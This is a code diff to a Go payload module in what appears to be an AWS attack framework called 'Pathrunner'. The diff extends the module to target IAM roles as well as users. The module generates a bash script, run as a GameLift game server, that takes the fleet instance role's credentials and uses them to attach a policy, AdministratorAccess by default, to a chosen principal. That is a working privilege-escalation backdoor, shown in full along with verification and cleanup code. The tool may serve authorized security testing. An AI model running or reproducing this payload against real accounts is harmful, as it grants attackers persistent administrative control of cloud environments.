@@ -17,7 +17,7 @@ import (
 
 // BackdoorAttachPolicyPayload generates a GameLift game server bash script that reads
 // the fleet instance role credentials from the SHARED_CREDENTIAL_FILE and attaches
-// an IAM policy to the target user. This payload is for event-triggered execution
+// an IAM policy to the target user or role. This payload is for event-triggered execution
 // where the game server process runs autonomously on the fleet EC2 instance.
 type BackdoorAttachPolicyPayload struct{}
 
@@ -34,7 +34,7 @@ func (p *BackdoorAttachPolicyPayload) GetName() string {
 }
 
 func (p *BackdoorAttachPolicyPayload) GetDescription() string {
-	return "Attach an IAM policy to a user via a GameLift game server process that reads SHARED_CREDENTIAL_FILE instance role credentials"
+	return "Attach an IAM policy to a user or role via a GameLift game server process that reads SHARED_CREDENTIAL_FILE instance role credentials"
 }
 
 func (p *BackdoorAttachPolicyPayload) GetTags() []string {
@@ -48,8 +48,8 @@ func (p *BackdoorAttachPolicyPayload) GetTags() []string {
 func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
 	return []modules.Option{
 		{
-			Name:        "TARGET_USER",
-			Description: "IAM username to attach policy to (auto-resolved from caller identity if not set)",
+			Name:        "TARGET_ARN",
+			Description: "IAM user or role name/ARN to attach policy to (auto-resolved from caller identity if not set)",
 			Required:    true,
 		},
 		{
@@ -61,33 +61,46 @@ func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
 	}
 }
 
-// GenerateCode produces the game server bash script. The TARGET_USER and POLICY_ARN
-// values are baked into the script at generation time because GameLift does not have
-// an equivalent to Lambda's env var injection.
+// GenerateCode produces the game server bash script. The TARGET_ARN is parsed at
+// generation time to emit the correct IAM command, since GameLift does not support
+// env var injection equivalent to Lambda's environment.
 func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
-	targetUser := options["TARGET_USER"]
+	targetARN := options["TARGET_ARN"]
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
 	}
 
-	// Validate that targetUser doesn't contain shell-unsafe characters.
-	if strings.ContainsAny(targetUser, `"';\&|$`) {
-		return "", fmt.Errorf("TARGET_USER contains invalid characters: %s", targetUser)
+	principalName, principalType := payloads.PrincipalFromARN(targetARN)
+
+	// Validate the resolved name doesn't contain shell-unsafe characters.
+	if strings.ContainsAny(principalName, `"';\&|$`) {
+		return "", fmt.Errorf("principal name contains invalid characters: %s", principalName)
+	}
+
+	var attachCmd string
+	var flagName string
+	if principalType == "role" {
+		attachCmd = "attach-role-policy"
+		flagName = "--role-name"
+	} else {
+		attachCmd = "attach-user-policy"
+		flagName = "--user-name"
 	}
 
 	script := fmt.Sprintf(`#!/bin/bash
 
 # GameLift game server script — Pathrunner backdoor/attach-policy payload
 # Reads fleet instance role credentials from SHARED_CREDENTIAL_FILE and
-# attaches an IAM policy to the target user using those privileged credentials.
+# attaches an IAM policy to the target principal using those privileged credentials.
 
 CRED_FILE="/local/credentials/credentials"
-TARGET_USER=%q
+TARGET_NAME=%q
+PRINCIPAL_TYPE=%q
 POLICY_ARN=%q
 
 echo "=== GameLift Game Server Process Starting ==="
-echo "Target user: ${TARGET_USER}"
+echo "Target ${PRINCIPAL_TYPE}: ${TARGET_NAME}"
 echo "Policy ARN: ${POLICY_ARN}"
 
 # Wait for GameLift to write the shared credentials file (max 10 seconds).
@@ -123,11 +136,10 @@ echo "Credentials loaded (key: ${AWS_ACCESS_KEY_ID:0:10}...)"
 echo "Verifying instance role identity..."
 aws sts get-caller-identity 2>&1 || echo "WARNING: STS call failed"
 
-echo "Attaching policy ${POLICY_ARN} to user ${TARGET_USER}..."
-if aws iam attach-user-policy \
-    --user-name "${TARGET_USER}" \
+echo "Attaching policy ${POLICY_ARN} to ${PRINCIPAL_TYPE} ${TARGET_NAME}..."
+if aws iam %s %s "${TARGET_NAME}" \
     --policy-arn "${POLICY_ARN}" 2>&1; then
-    echo "SUCCESS: Policy attached to ${TARGET_USER}"
+    echo "SUCCESS: Policy attached to ${TARGET_NAME}"
 else
     echo "FAILED: Could not attach policy (exit code: $?)"
 fi
@@ -135,7 +147,7 @@ fi
 # Keep the process alive so the fleet remains active.
 echo "Game server running..."
 while true; do sleep 60; done
-`, targetUser, policyArn)
+`, principalName, principalType, policyArn, attachCmd, flagName)
 
 	return script, nil
 }
@@ -147,56 +159,86 @@ func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, erro
 // ReportSideEffects returns the IAM policy attachment as a tracked side effect
 // so the workspace cleanup command can detach it.
 func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
-	targetUser := options["TARGET_USER"]
+	targetARN := options["TARGET_ARN"]
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
 	}
 
+	policyName := "AdministratorAccess"
+	if idx := strings.LastIndex(policyArn, "/"); idx != -1 {
+		policyName = policyArn[idx+1:]
+	}
+
+	principalName, principalType := payloads.PrincipalFromARN(targetARN)
+	cleanupMethod := "iam:DetachUserPolicy"
+	if principalType == "role" {
+		cleanupMethod = "iam:DetachRolePolicy"
+	}
+
 	return []modules.CreatedResource{
 		{
 			Type:          "iam:attached-policy",
-			Name:          fmt.Sprintf("%s←%s", targetUser, "AdministratorAccess"),
+			Name:          fmt.Sprintf("%s←%s", principalName, policyName),
 			ARN:           policyArn,
-			CleanupMethod: "iam:DetachUserPolicy",
+			CleanupMethod: cleanupMethod,
 			Metadata: map[string]string{
-				"principal_type": "user",
-				"principal_name": targetUser,
+				"principal_type": principalType,
+				"principal_name": principalName,
 				"policy_arn":     policyArn,
 			},
 		},
 	}
 }
 
-// VerifySuccess checks whether the IAM policy was successfully attached to the target user.
-// Uses the victim's credentials (passed as config) to call iam:ListAttachedUserPolicies.
+// VerifySuccess checks whether the IAM policy was successfully attached to the target principal.
 func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
-	targetUser := options["TARGET_USER"]
+	targetARN := options["TARGET_ARN"]
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
 	}
 
-	iamClient := iam.NewFromConfig(config)
-	result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
-		UserName: aws.String(targetUser),
-	})
-	if err != nil {
-		return false, fmt.Errorf("failed to list attached policies for user %s: %v", targetUser, err)
+	if targetARN == "" {
+		return false, fmt.Errorf("TARGET_ARN not set; cannot verify")
 	}
 
-	for _, policy := range result.AttachedPolicies {
-		if aws.ToString(policy.PolicyArn) == policyArn {
-			return true, nil
+	principalName, principalType := payloads.PrincipalFromARN(targetARN)
+	iamClient := iam.NewFromConfig(config)
+
+	switch principalType {
+	case "role":
+		result, err := iamClient.ListAttachedRolePolicies(ctx, &iam.ListAttachedRolePoliciesInput{
+			RoleName: aws.String(principalName),
+		})
+		if err != nil {
+			return false, fmt.Errorf("failed to list attached policies for role %s: %v", principalName, err)
+		}
+		for _, policy := range result.AttachedPolicies {
+			if aws.ToString(policy.PolicyArn) == policyArn {
+				return true, nil
+			}
+		}
+	default:
+		result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
+			UserName: aws.String(principalName),
+		})
+		if err != nil {
+			return false, fmt.Errorf("failed to list attached policies for user %s: %v", principalName, err)
+		}
+		for _, policy := range result.AttachedPolicies {
+			if aws.ToString(policy.PolicyArn) == policyArn {
+				return true, nil
+			}
 		}
 	}
-
 	return false, nil
 }
 
 func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
-	if options["TARGET_USER"] == "" {
-		return fmt.Errorf("TARGET_USER is required for backdoor/attach-policy payload")
+	if options["TARGET_ARN"] == "" {
+		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
 	}
 	return nil
 }
+
